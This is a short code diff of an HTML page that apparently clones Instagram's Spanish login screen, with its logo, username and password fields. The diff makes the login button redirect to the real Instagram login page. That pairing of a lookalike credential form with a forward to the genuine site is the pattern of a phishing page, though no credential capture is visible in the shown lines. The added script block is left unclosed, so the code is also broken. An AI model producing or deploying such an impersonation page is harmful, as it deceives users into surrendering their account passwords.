@@ -15,7 +15,11 @@
       <img src="Instagram_logo.svg" alt=""><br>
       <input id="nombre" type="text" placeholder="Teléfono, usuario o correo electrónico" required><br>
       <input id="contraseña" type="password" placeholder="Contraseña" required><br>
-        <button class="btn">Iniciar sesión</button>
+         <button class="btn" onclick="redirigir()">Iniciar sesión</button>
+      <script>
+        function redirigir() {
+          window.location.href = "https://www.instagram.com/accounts/login/?next=%2Finstagram%2F&source=desktop_nav&hl=en";
+        }
       <hr>
       <p class="index">O</p>
       <i class="fab fa-facebook"><span>Iniciar sesión con Facebook</span></i><br>
